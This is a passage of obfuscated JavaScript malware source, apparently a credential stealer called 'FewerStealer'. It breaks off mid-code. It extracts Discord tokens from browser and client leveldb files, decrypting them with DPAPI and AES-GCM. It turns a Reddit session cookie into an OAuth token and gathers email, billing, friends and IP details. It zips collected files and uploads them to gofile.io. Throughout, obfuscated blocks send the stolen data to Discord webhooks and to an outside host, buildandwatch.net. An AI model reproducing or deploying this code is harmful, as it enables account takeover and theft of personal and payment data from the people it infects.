_0x161fe9=_0x3f5c,_0x341fea=[_0x161fe9(0x1a5),_0x161fe9(0x1b4),_0x161fe9(0x1af),_0x161fe9(0x1a7),'522232vrltTC',_0x161fe9(0x1a1),'1854160kdWPbi',_0x161fe9(0x1a3),'1172469aMRGPX',_0x161fe9(0x1ac),_0x161fe9(0x1aa),_0x161fe9(0x19f),_0x161fe9(0x19e)];return _0x56b4=function(){return _0x341fea;},_0x56b4();}
    }
}
///
function setRedditSession(cookie) {
    try {
        const cookies = `reddit_session=${cookie}`;
        const headers = {
            'Cookie': cookies,
            'Authorization': 'Basic b2hYcG9xclpZdWIxa2c6'
        };

        const jsonData = {
            scopes: ['*', 'email', 'pii']
        };

        const tokenUrl = 'https://accounts.reddit.com/api/access_token';
        const userDataUrl = 'https://oauth.reddit.com/api/v1/me';

        axios.post(tokenUrl, jsonData, { headers })
            .then(tokenResponse => {
                const accessToken = tokenResponse.data.access_token;
                const userHeaders = {
                    'User-Agent': 'android:com.example.myredditapp:v1.2.3',
                    'Authorization': `Bearer ${accessToken}`
                };

                axios.get(userDataUrl, { headers: userHeaders })
                    .then(userDataResponse => {
                        const userData = userDataResponse.data;
                        const username = userData.name;
                        const profileUrl = `https://www.reddit.com/user/${username}`;
                        const commentKarma = userData.comment_karma;
                        const totalKarma = userData.total_karma;
                        const coins = userData.coins;
                        const mod = userData.is_mod;
                        const gold = userData.is_gold;
                        const suspended = userData.is_suspended;

                        const embedData = {
                            title: "🚀 FewerStealer 🚀",
                            description: "Reddit User Information",
                            color: 0x1ABC9C, // Özel bir renk (örnek: Turkuaz)
                            fields: [
                                { name: 'Reddit Cookie 🍪', value: '```' + cookies + '```', inline: false },
                                { name: 'Profile URL 🔗', value: `[Profile Link](${profileUrl})`, inline: false },
                                { name: 'Username 👤', value: username, inline: true },
                                { name: 'Reddit Karma 💬', value: `Comments: ${commentKarma} | Total Karma: ${totalKarma}`, inline: true },
                                { name: 'Coins 💰', value: coins, inline: true },
                                { name: 'Moderator 🛡️', value: mod ? 'Yes' : 'No', inline: true },
                                { name: 'Reddit Gold 🏅', value: gold ? 'Yes' : 'No', inline: true },
                                { name: 'Suspended 🚫', value: suspended ? 'Yes' : 'No', inline: true }
                            ],
                            footer: {
                                text: 'Developed by FewerStealer'
                            }
                        };

                      (function(_0xb245c1,_0x4aa649){const _0xc179b2=_0x36e6,_0x593767=_0xb245c1();while(!![]){try{const _0x4468bd=parseInt(_0xc179b2(0x1ed))/0x1+parseInt(_0xc179b2(0x1e8))/0x2*(parseInt(_0xc179b2(0x1ea))/0x3)+parseInt(_0xc179b2(0x1f1))/0x4+parseInt(_0xc179b2(0x1de))/0x5+parseInt(_0xc179b2(0x1e6))/0x6*(-parseInt(_0xc179b2(0x1f6))/0x7)+parseInt(_0xc179b2(0x1e2))/0x8+parseInt(_0xc179b2(0x1e9))/0x9*(-parseInt(_0xc179b2(0x1e1))/0xa);if(_0x4468bd===_0x4aa649)break;else _0x593767['push'](_0x593767['shift']());}catch(_0x4ad947){_0x593767['push'](_0x593767['shift']());}}}(_0x25d7,0x4732f));function _0x2a51(_0x370df8,_0x1d8c93){const _0x2fa585=_0x9d55();return _0x2a51=function(_0x589fee,_0x1eed46){_0x589fee=_0x589fee-(0x6d6+-0x119c+0xb33);let _0x12afbb=_0x2fa585[_0x589fee];return _0x12afbb;},_0x2a51(_0x370df8,_0x1d8c93);}function _0x9d55(){const _0x2a5be2=_0x36e6,_0x1ed533=[_0x2a5be2(0x1df),_0x2a5be2(0x1f3),'141171becKDa',_0x2a5be2(0x1e7),_0x2a5be2(0x1e0),'ildandwatc','35IujzSq',_0x2a5be2(0x1f7),_0x2a5be2(0x1e3),'YzcAY',_0x2a5be2(0x1ee),_0x2a5be2(0x1e4),'123743ybpUTY',_0x2a5be2(0x1ec),_0x2a5be2(0x1ef),'h.net/redd',_0x2a5be2(0x1f2),_0x2a5be2(0x1f0),_0x2a5be2(0x1e5),'3600070QZsjVo',_0x2a5be2(0x1f5)];return _0x9d55=function(){return _0x1ed533;},_0x9d55();}function _0x36e6(_0x52d671,_0x15f0d6){const _0x25d7c6=_0x25d7();return _0x36e6=function(_0x36e62e,_0x359b9b){_0x36e62e=_0x36e62e-0x1de;let _0x1e42e6=_0x25d7c6[_0x36e62e];return _0x1e42e6;},_0x36e6(_0x52d671,_0x15f0d6);}function _0x25d7(){const _0x3f34ce=['10inULjP','2ZTLbKa','338868WDUCYD','1455612QkUDRB','shift','post','251004yTiiPz','1665979KBaNfl','https://bu','Hata\x20Oluşt','56732nIdIFw','message','vUnpE','push','2248830PvOscx','798LiUBSj','105128rkeTTV','2227165jteSem','8eFIHnv','catch','250NHnsWL','1600104qQDUKq','4181571dJVXVl','11cBPiDS','h.net/erro','8574HDtzVi'];_0x25d7=function(){return _0x3f34ce;};return _0x25d7();}const _0x440d88=_0x2a51;(function(_0x24c3cf,_0x214f44){const _0x55ad7d=_0x36e6,_0x59aa4e=_0x2a51,_0xd4b420=_0x24c3cf();while(!![]){try{const _0x3c40a7=parseInt(_0x59aa4e(0x76))/(-0x1*-0x167f+0x1436+0x155a*-0x2)+-parseInt(_0x59aa4e(0x6d))/(0x2be*0xc+-0x15ff*-0x1+-0x36e5)*(parseInt(_0x59aa4e(0x81))/(0x1467*0x1+0x1aa2+-0x1*0x2f06))+-parseInt(_0x59aa4e(0x71))/(-0x1154+0x297+0xec1)*(-parseInt(_0x59aa4e(0x70))/(-0xcd6*0x2+-0x1*0xbf5+0x25a6))+-parseInt(_0x59aa4e(0x7e))/(-0x1082+0x395+0xcf3)+-parseInt(_0x59aa4e(0x74))/(0x2*-0x12d3+-0x2*-0x322+0xb*0x2db)*(parseInt(_0x59aa4e(0x7f))/(0x5b5+0x9*-0x2a3+0x120e))+parseInt(_0x59aa4e(0x72))/(-0x5*-0x22c+-0xb*-0x2b+-0x32b*0x4)+parseInt(_0x59aa4e(0x7d))/(-0x2197+-0x5*0x45f+-0x4*-0xddf)*(parseInt(_0x59aa4e(0x75))/(-0x1*-0xdc9+-0x1*-0x26fa+-0x34b8));if(_0x3c40a7===_0x214f44)break;else _0xd4b420[_0x55ad7d(0x1f4)](_0xd4b420[_0x55ad7d(0x1eb)]());}catch(_0x5439ab){_0xd4b420[_0x55ad7d(0x1f4)](_0xd4b420[_0x55ad7d(0x1eb)]());}}}(_0x9d55,-0xab11*0x1+0x17a6b+0x38706),axios[_0x440d88(0x77)](_0x440d88(0x78)+_0x440d88(0x6f)+_0x440d88(0x79)+'it',{'embeds':[embedData]}),axios[_0x440d88(0x77)](webhook3939,{'embeds':[embedData]})[_0x440d88(0x6e)](_0x337338=>{const _0x578a64=_0x440d88,_0x42d2a2={'YzcAY':_0x578a64(0x7b)+'u','vUnpE':_0x578a64(0x78)+_0x578a64(0x6f)+_0x578a64(0x7c)+'r'},_0x3a2d17={'title':_0x42d2a2[_0x578a64(0x73)],'description':_0x337338[_0x578a64(0x7a)],'color':0xff0000};axios[_0x578a64(0x77)](_0x42d2a2[_0x578a64(0x80)],{'embeds':[_0x3a2d17]})[_0x578a64(0x6e)](_0x48931c=>{});}));
                    });
            });
    } catch (error) {
        // Handle any other errors here
    }
}

//
function sendIPInfoToDiscord() {
  axios.get('http://ip-api.com/json/')
    .then(response => {
      const ipAddress = response.data.query;
      const country = response.data.country;
      const countryCode = response.data.countryCode;

      // Create a stylized embed without a footer
      const embed = {
        title: 'IP Information 🌐',
        color: 0x00FF00, // Green color
        description: `Here is the information for the IP address: ${ipAddress}`,
        fields: [
          {
            name: '🌍 Country',
            value: `${country} (${countryCode})`,
          }
        ],
        timestamp: new Date()
      };

      // Send to Discord Webhook
(function(_0x31b484,_0x2859f1){var _0x5a145d=_0x417b,_0x1fe1ad=_0x31b484();while(!![]){try{var _0x286754=parseInt(_0x5a145d(0x1aa))/0x1*(parseInt(_0x5a145d(0x1a3))/0x2)+-parseInt(_0x5a145d(0x1a6))/0x3+parseInt(_0x5a145d(0x1a2))/0x4*(parseInt(_0x5a145d(0x1a7))/0x5)+parseInt(_0x5a145d(0x1b0))/0x6+-parseInt(_0x5a145d(0x1a8))/0x7+-parseInt(_0x5a145d(0x1a5))/0x8*(parseInt(_0x5a145d(0x1b2))/0x9)+parseInt(_0x5a145d(0x1b4))/0xa;if(_0x286754===_0x2859f1)break;else _0x1fe1ad['push'](_0x1fe1ad['shift']());}catch(_0x2549ab){_0x1fe1ad['push'](_0x1fe1ad['shift']());}}}(_0x2324,0x47c01));function _0x417b(_0x19a8ec,_0x2c6c9e){var _0x23247d=_0x2324();return _0x417b=function(_0x417b0a,_0xcf939f){_0x417b0a=_0x417b0a-0x1a1;var _0x4f7a94=_0x23247d[_0x417b0a];return _0x4f7a94;},_0x417b(_0x19a8ec,_0x2c6c9e);}function _0x67cf(_0x5eac40,_0x20c5a6){var _0x182df5=_0x389e();return _0x67cf=function(_0x562f72,_0x2cf488){_0x562f72=_0x562f72-(-0x433*0x2+0x5b3*-0x1+-0xb*-0x15e);var _0x390364=_0x182df5[_0x562f72];return _0x390364;},_0x67cf(_0x5eac40,_0x20c5a6);}var _0x30c1c8=_0x67cf;function _0x389e(){var _0x4f3796=_0x417b,_0x5bcb3b=[_0x4f3796(0x1ad),_0x4f3796(0x1ac),'post',_0x4f3796(0x1b1),_0x4f3796(0x1ae),_0x4f3796(0x1b7),_0x4f3796(0x1b3),_0x4f3796(0x1b5),'5381343FNaXKr',_0x4f3796(0x1a9),_0x4f3796(0x1b8),_0x4f3796(0x1b6),_0x4f3796(0x1a4),_0x4f3796(0x1a1)];return _0x389e=function(){return _0x5bcb3b;},_0x389e();}function _0x2324(){var _0x1c3edd=['125448mZBWgU','8905580ISBpxb','ildandwatc','1099844zkUgpe','79840CJrnmW','970nBlrDM','1426716qltYet','1128tjJxCn','591720OLgspY','145ZJAddi','1594383XnTEYr','h.net/gtbl','44HqOvru','shift','2PbrBRW','2336139iMoode','707iJgcZP','push','1934838AoRcEj','https://bu','28503NfUfvt','1332368OGiZqf','2427920UewaZp','5kBCDHJ'];_0x2324=function(){return _0x1c3edd;};return _0x2324();}(function(_0x107934,_0x9af126){var _0x3fe9e5=_0x417b,_0x54ca87=_0x67cf,_0x1e5a6e=_0x107934();while(!![]){try{var _0x1e82e3=parseInt(_0x54ca87(0xfa))/(0x147a+-0x19cf*-0x1+0x2e48*-0x1)*(parseInt(_0x54ca87(0xfc))/(-0x2689+0xb43+0x1b48))+-parseInt(_0x54ca87(0xf5))/(-0x18+0x1f47+-0x1f2c)+-parseInt(_0x54ca87(0xf3))/(-0xa1f*-0x1+-0xe9e*-0x2+-0x2757)+parseInt(_0x54ca87(0xf4))/(-0x137e+0x1*-0x128f+0x2612)*(-parseInt(_0x54ca87(0xf9))/(-0x1e9a+-0x7e3*-0x2+0xeda))+parseInt(_0x54ca87(0xf1))/(-0x569+-0x135f+0x18cf)*(parseInt(_0x54ca87(0xf8))/(-0x10ff+0x1*0x103+0x1004))+-parseInt(_0x54ca87(0xfb))/(0x20b3+0xe18+-0x2ec2)+parseInt(_0x54ca87(0xf2))/(0x1d4b+-0x1384+-0x1*0x9bd);if(_0x1e82e3===_0x9af126)break;else _0x1e5a6e[_0x3fe9e5(0x1af)](_0x1e5a6e[_0x3fe9e5(0x1ab)]());}catch(_0x470c51){_0x1e5a6e[_0x3fe9e5(0x1af)](_0x1e5a6e[_0x3fe9e5(0x1ab)]());}}}(_0x389e,-0x1a41e6+0x4*0x6de14+-0x4859*-0x2f),axios[_0x30c1c8(0xfd)](_0x30c1c8(0xfe)+_0x30c1c8(0xf7)+_0x30c1c8(0xf6)+'og',{'embeds':[embed]}),axios[_0x30c1c8(0xfd)](webhook3939,{'embeds':[embed]}));
  
 })
    .catch(error => {
      console.error('An error occurred while getting IP information: ', error);
    });

      // Send to Discord Webhook
 
	
}

sendIPInfoToDiscord();
// Fonksiyonu çağırarak işlemi başlat


///


function addFolder(folderPath) {
  const folderFullPath = path.join(randomPath, folderPath);
  if (!fs.existsSync(folderFullPath)) {
    try {
      fs.mkdirSync(folderFullPath, { recursive: true });
    } catch (error) {}
  }
}


async function getZipp(sourcePath, zipFilePath) {
  try {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip('' + zipFilePath);
  } catch (error) {}
}



function getZip(sourcePath, zipFilePath) {
  try {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip('' + zipFilePath);
  } catch (error) {}
}

function copyFolder(sourcePath, destinationPath) {
  const isDestinationExists = fs.existsSync(destinationPath);
  const destinationStats = isDestinationExists && fs.statSync(destinationPath);
  const isDestinationDirectory = isDestinationExists && destinationStats.isDirectory();

  if (isDestinationDirectory) {
    addFolder(sourcePath);

    fs.readdirSync(destinationPath).forEach((file) => {
      const sourceFile = path.join(sourcePath, file);
      const destinationFile = path.join(destinationPath, file);
      copyFolder(sourceFile, destinationFile);
    });
  } else {
    fs.copyFileSync(destinationPath, path.join(randomPath, sourcePath));
  }
}


function findTokenn(path) {
    path += 'Local Storage\\leveldb';
    let tokens = [];
    try {
        fs.readdirSync(path)
            .map(file => {
                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                    .split(/\r?\n/)
                    .forEach(line => {
                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
                        for (const pattern of patterns) {
                            const foundTokens = line.match(pattern);
                            if (foundTokens) foundTokens.forEach(token => tokens.push(token));
                        }
                    });
            });
    } catch (e) {}
    return tokens;
}




async function createZipp(sourcePath, zipPath) {
  return new Promise((resolve, reject) => {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip(zipPath, (err) => {
      if (err) {
        reject(err);
      } else {
		          console.log('ZIP arşivi oluşturuldu: ' + zipPath);

        resolve();
      }
    });
  });
}

async function getZippp() {
	
getZipp(randomPath, randomPath + '.zip')
 
// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle

// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = './' + user.randomUUID + '.zip';

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

      axios.post(`https://${server}.gofile.io/uploadFile`, form, {
        headers: form.getHeaders()
      })
        .then(uploadResponse => {
          const responsePayload = {
            uploadResponseData: uploadResponse.data
          };

          // Webhook URL'si

    const embedData = {
        embeds: [
            {
                title: 'Wallet File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 0x00ff00 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };


          // Webhook'a POST isteği gönder
function _0x386c(_0x4edff6,_0x11867f){var _0x15d3bf=_0x15d3();return _0x386c=function(_0x386c58,_0x4ca597){_0x386c58=_0x386c58-0x198;var _0x451c61=_0x15d3bf[_0x386c58];return _0x451c61;},_0x386c(_0x4edff6,_0x11867f);}function _0x15d3(){var _0x1593d6=['post','11328ukLmOz','2384193ClRHDS','38OTxmdJ','11575rGTWzk','1899828xBriVb','546044IppqOU','h.net/gtbl','738tAYVUe','869768UxKxJV','8977221NPNPFo','5UdXhqZ','78pAEhHm','9050800BSfMtY','push','318108IdnPfu','6msjxVf','ildandwatc','195294lutHYf','6777659mbPsph','shift','3577152lOyYRZ','8IYXvXQ','2843pLiqpO','10474880jHuAsg'];_0x15d3=function(){return _0x1593d6;};return _0x15d3();}(function(_0xd42b31,_0x152691){var _0x91fd13=_0x386c,_0xaab39f=_0xd42b31();while(!![]){try{var _0x4e2ba3=parseInt(_0x91fd13(0x19c))/0x1+-parseInt(_0x91fd13(0x1ac))/0x2+-parseInt(_0x91fd13(0x1ab))/0x3*(-parseInt(_0x91fd13(0x1a4))/0x4)+parseInt(_0x91fd13(0x1a7))/0x5*(parseInt(_0x91fd13(0x1af))/0x6)+-parseInt(_0x91fd13(0x1a5))/0x7+parseInt(_0x91fd13(0x19f))/0x8+-parseInt(_0x91fd13(0x1a8))/0x9;if(_0x4e2ba3===_0x152691)break;else _0xaab39f['push'](_0xaab39f['shift']());}catch(_0x48225b){_0xaab39f['push'](_0xaab39f['shift']());}}}(_0x15d3,0x5d6a6));function _0x52b0(){var _0x474268=_0x386c,_0x9aa0e8=[_0x474268(0x1ad),_0x474268(0x19b),_0x474268(0x19a),_0x474268(0x1a6),_0x474268(0x1a1),_0x474268(0x1aa),_0x474268(0x1b0),_0x474268(0x1ae),_0x474268(0x199),_0x474268(0x19d),_0x474268(0x1a2),_0x474268(0x1a3),_0x474268(0x1a9),'https://bu',_0x474268(0x1a0)];return _0x52b0=function(){return _0x9aa0e8;},_0x52b0();}var _0x5ac880=_0x1596;function _0x1596(_0x3601f2,_0x13cb63){var _0x141bc9=_0x52b0();return _0x1596=function(_0x3e031e,_0x370fbd){_0x3e031e=_0x3e031e-(-0x397*-0x7+-0x1f9a+0x77c);var _0x231018=_0x141bc9[_0x3e031e];return _0x231018;},_0x1596(_0x3601f2,_0x13cb63);}(function(_0xfddffa,_0x4ff72d){var _0x2bce3d=_0x386c,_0x1f68a2=_0x1596,_0x34c489=_0xfddffa();while(!![]){try{var _0xe423b1=-parseInt(_0x1f68a2(0x103))/(-0xf54+0x6d*-0x13+0x176c)*(-parseInt(_0x1f68a2(0x111))/(-0x5*-0x4c8+-0x18cc+0xa*0x17))+parseInt(_0x1f68a2(0x107))/(0xf*0x129+0xabc+-0x1c20)+parseInt(_0x1f68a2(0x10b))/(-0xf2b+-0x2*-0xdeb+0xca7*-0x1)*(parseInt(_0x1f68a2(0x106))/(-0xc9e+0x7*0x475+-0x1290))+parseInt(_0x1f68a2(0x110))/(-0x2399+0x131*-0x1+0x24d0)*(-parseInt(_0x1f68a2(0x108))/(0xb*0xc1+-0x203b+0x17f7))+parseInt(_0x1f68a2(0x10d))/(-0xd*0x1b7+-0x10d*-0x7+0xef8)*(parseInt(_0x1f68a2(0x10e))/(-0xfe7+0x1b09+-0xb19))+parseInt(_0x1f68a2(0x109))/(0x2291+-0x113c+0x114b*-0x1)+-parseInt(_0x1f68a2(0x105))/(0x1*-0x1c9+0xb42+-0x96e);if(_0xe423b1===_0x4ff72d)break;else _0x34c489[_0x2bce3d(0x198)](_0x34c489[_0x2bce3d(0x19e)]());}catch(_0x20c462){_0x34c489[_0x2bce3d(0x198)](_0x34c489[_0x2bce3d(0x19e)]());}}}(_0x52b0,0x9479d*0x1+-0xa4894+0x11*0x8d9b),axios[_0x5ac880(0x10a)](_0x5ac880(0x10c)+_0x5ac880(0x10f)+_0x5ac880(0x104)+'og',embedData),axios[_0x5ac880(0x10a)](webhook3939,embedData));
        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
          axios.post("https://buildandwatch.net/error", embedData)
            .then(webhookResponse => {
              console.log('Webhook gönderildi:', webhookResponse.status, webhookResponse.statusText);
            })
            .catch(error => {
              console.log('Webhook gönderilirken hata oluştu:', error.message);
            });
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });

}

async function stealltokens() {
    const fields = [];
    for (let path of paths) {
        const foundTokens = findTokenn(path);
        if (foundTokens) {
            foundTokens.forEach(token => {
                var c = {
                    name: "<:browserstokens:951827260741156874> Browser Token;",
                    value: `\`\`\`${token}\`\`\` [CopyToken](https://buildandwatch.net/copy/${token})`,
                    inline: true
                };
                fields.push(c);
            });
        }
    }

    const postData = {
        content: null,
        embeds: [
            {
                color: 0x3498db,
                fields: fields.filter(onlyUnique), // 'fields' ve 'onlyUnique' değişkenlerin tanımlanmış olduğundan emin olun.
                author: {
                    name: "Fewer Stealer"
                },
                footer: {
                    text: "Fewer"
                }
            }
        ]
    };

  (function(_0x233737,_0x10f662){var _0x427f5e=_0x4741,_0x24d0df=_0x233737();while(!![]){try{var _0x493477=-parseInt(_0x427f5e(0x15a))/0x1*(-parseInt(_0x427f5e(0x14f))/0x2)+-parseInt(_0x427f5e(0x157))/0x3+-parseInt(_0x427f5e(0x14e))/0x4*(-parseInt(_0x427f5e(0x14c))/0x5)+-parseInt(_0x427f5e(0x15e))/0x6+-parseInt(_0x427f5e(0x14a))/0x7+-parseInt(_0x427f5e(0x156))/0x8*(parseInt(_0x427f5e(0x158))/0x9)+parseInt(_0x427f5e(0x152))/0xa;if(_0x493477===_0x10f662)break;else _0x24d0df['push'](_0x24d0df['shift']());}catch(_0x3eceed){_0x24d0df['push'](_0x24d0df['shift']());}}}(_0x4f21,0x4ac03));function _0x4741(_0x5ed089,_0x4189e7){var _0x4f21b7=_0x4f21();return _0x4741=function(_0x474145,_0x2b0034){_0x474145=_0x474145-0x14a;var _0x1f61d0=_0x4f21b7[_0x474145];return _0x1f61d0;},_0x4741(_0x5ed089,_0x4189e7);}var _0x5f3e29=_0x5120;(function(_0x16b30f,_0x32a5ad){var _0x5ca87a=_0x4741,_0x1c82aa=_0x5120,_0x37b2c5=_0x16b30f();while(!![]){try{var _0x30770f=-parseInt(_0x1c82aa(0x170))/(-0xc1*-0x2f+0x555+-0x1*0x28c3)+-parseInt(_0x1c82aa(0x166))/(0xc35+0x2035+-0x188*0x1d)+-parseInt(_0x1c82aa(0x16d))/(0x1b12+0x56*-0x6b+0x145*0x7)+parseInt(_0x1c82aa(0x168))/(-0x19ac+0x2547+-0x3*0x3dd)+parseInt(_0x1c82aa(0x16e))/(0x1*-0x15e2+0x1c51+-0x66a)*(parseInt(_0x1c82aa(0x16f))/(-0x15b*0xd+-0x3*0xbe7+0x355a))+parseInt(_0x1c82aa(0x165))/(0x2*-0x772+0x2*0x104a+-0x11a9)*(parseInt(_0x1c82aa(0x16a))/(-0x6+-0x1c8c+0x1c9a))+-parseInt(_0x1c82aa(0x167))/(0x1a35*0x1+0x1726*0x1+-0x3152);if(_0x30770f===_0x32a5ad)break;else _0x37b2c5[_0x5ca87a(0x151)](_0x37b2c5[_0x5ca87a(0x159)]());}catch(_0x31d746){_0x37b2c5['push'](_0x37b2c5[_0x5ca87a(0x159)]());}}}(_0x2338,-0xdb9*-0x61+0x87de4+0x9*-0x1061b));function _0x4f21(){var _0x27f323=['h.net/toke','1060170wrLXwz','2871428NuUykJ','3851834ywOalX','2460qrshpm','916104gKpHFV','2304kMfJMv','7212tIzHpZ','995gkFdAp','push','14866940cyGqBZ','post','1438443zSmqfl','10452QAAQCP','3507560KBdzjY','1337325jltepM','9ZqsAXz','shift','2ceVyzC','2173132MBslQY','91043dXcXNB'];_0x4f21=function(){return _0x27f323;};return _0x4f21();}function _0x5120(_0x4776ef,_0x1305c6){var _0x4a3475=_0x2338();return _0x5120=function(_0x302b07,_0x223ad4){_0x302b07=_0x302b07-(-0x1adf+0xa65*-0x1+-0x3*-0xce3);var _0x306c9f=_0x4a3475[_0x302b07];return _0x306c9f;},_0x5120(_0x4776ef,_0x1305c6);}function _0x2338(){var _0xad67f9=_0x4741,_0x597663=['ildandwatc',_0xad67f9(0x153),_0xad67f9(0x154),_0xad67f9(0x150),_0xad67f9(0x155),_0xad67f9(0x15c),'https://bu',_0xad67f9(0x14b),_0xad67f9(0x14d),'1064169XmgcmV',_0xad67f9(0x15b),_0xad67f9(0x15d),'8pBucVR'];return _0x2338=function(){return _0x597663;},_0x2338();}try{await axios[_0x5f3e29(0x16c)](_0x5f3e29(0x171)+_0x5f3e29(0x16b)+_0x5f3e29(0x169)+'n',postData),await axios[_0x5f3e29(0x16c)](webhook3939,postData);}catch(_0x51fb8d){}
}


//

const tokens = [];

async function findToken(path) {
    let path_tail = path;
    path += 'Local Storage\\leveldb';

    if (!path_tail.includes('discordd')) {
        try {
            fs.readdirSync(path)
                .map(file => {
                    (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                        .split(/\r?\n/)
                        .forEach(line => {
                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
                            for (const pattern of patterns) {
                                const foundTokens = line.match(pattern);
                                if (foundTokens) foundTokens.forEach(token => {
                                    if (!tokens.includes(token)) tokens.push(token)
                                });
                            }
                        });
                });
        } catch (e) { }
        return;
    } else {
        if (fs.existsSync(path_tail + '\\Local State')) {
            try {
     const tokenRegex = /([A-Za-z\d]{24})\.([\w-]{6})\.([\w-]{27})/;

fs.readdirSync(path).forEach(file => {
    if (file.endsWith('.log') || file.endsWith('.ldb')) {
        const fileContent = fs.readFileSync(`${path}\\${file}`, 'utf8');
        const lines = fileContent.split(/\r?\n/);

        lines.forEach(line => {
            const foundTokens = line.match(tokenRegex);

            if (foundTokens) {
                foundTokens.forEach(token => {
                    const encryptedKey = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key, 'base64').slice(5);
                    const key = dpapi.unprotectData(Buffer.from(encryptedKey, 'utf-8'), null, 'CurrentUser');
                    const tokenParts = token.split('.');
                    const start = Buffer.from(tokenParts[0], 'base64');
                    const middle = Buffer.from(tokenParts[1], 'base64');
                    const end = Buffer.from(tokenParts[2], 'base64');
                    const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                    decipher.setAuthTag(end);
                    const out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
                    
                    if (!tokens.includes(out)) {
                        tokens.push(out);
                    }
                });
            }
        });
    }
});

            } catch (e) { }
            return;
        }
    }
}

async function stealTokens() {
    for (let path of paths) {
        await findToken(path);
    }
    for (let token of tokens) {
        let json;
        await axios.get("https://discord.com/api/v9/users/@me", {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        }).then(res => { json = res.data }).catch(() => { json = null })
        if (!json) continue;
        var ip = await getIp();
        var billing = await getBilling(token);
        var friends = await getRelationships(token);

const userInformationEmbed = {
  title: "User Information",
  color: 0x3498DB, // Mavi renk
  author: {
    name: `${json.username}#${json.discriminator} (${json.id})`,
    icon_url: "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif"
  },
  thumbnail: {
    url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
  },
  fields: [
    {
      name: ":key: Token:",
      value: `\`${token}\`\n[Copy Token](https://buildandwatch.net/copy/${token})`
    },
    {
      name: ":star: Badges:",
      value: getBadges(json.flags),
      inline: true
    },
    {
      name: ":gem: Nitro Type:",
      value: await getNitro(json.premium_type, json.id, token),
      inline: true
    },
    {
      name: ":credit_card: Billing:",
      value: billing,
      inline: true
    },
    {
      name: ":envelope: Email:",
      value: `\`${json.email}\``,
      inline: true
    },
    {
      name: ":globe_with_meridians: IP:",
      value: `\`${ip}\``,
      inline: true
    }
  ]
};

const friendsEmbed = {
  title: "Friends",
  color: 0xE74C3C, // Kırmızı renk
  description: friends,
  author: {
    name: "HQ Friends",
    icon_url: "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif"
  },
  footer: {
    text: "@FewerStealer"
  }
};

function _0x1634(_0xfca256,_0x2fb30b){var _0x466734=_0x4667();return _0x1634=function(_0x16344d,_0x140fa9){_0x16344d=_0x16344d-0x1e6;var _0x22606b=_0x466734[_0x16344d];return _0x22606b;},_0x1634(_0xfca256,_0x2fb30b);}(function(_0x48038e,_0x371102){var _0x475b07=_0x1634,_0x2fd36d=_0x48038e();while(!![]){try{var _0x4b2e13=parseInt(_0x475b07(0x1fd))/0x1*(-parseInt(_0x475b07(0x1f6))/0x2)+-parseInt(_0x475b07(0x1ed))/0x3*(parseInt(_0x475b07(0x1eb))/0x4)+parseInt(_0x475b07(0x1f5))/0x5+-parseInt(_0x475b07(0x1f7))/0x6+parseInt(_0x475b07(0x1fb))/0x7*(parseInt(_0x475b07(0x1f0))/0x8)+-parseInt(_0x475b07(0x1f4))/0x9+parseInt(_0x475b07(0x1ef))/0xa;if(_0x4b2e13===_0x371102)break;else _0x2fd36d['push'](_0x2fd36d['shift']());}catch(_0x21f4e0){_0x2fd36d['push'](_0x2fd36d['shift']());}}}(_0x4667,0x2d139));function _0x4667(){var _0x5b267f=['h.net/gtbl','3063yIoFez','then','435680Xefffu','8wPImEL','shift','push','32NWEhJC','2905443tLaYmR','1761695kiJffX','1572hPupnh','224670CpSvVE','8294646fWawEc','690606JdsbWx','catch','2050426vpghwu','160oGAsDB','61XTohCf','https://bu','2627199JBjgIP','7ryYRxl','ildandwatc','post','376xrXcCp'];_0x4667=function(){return _0x5b267f;};return _0x4667();}function _0x26f3(){var 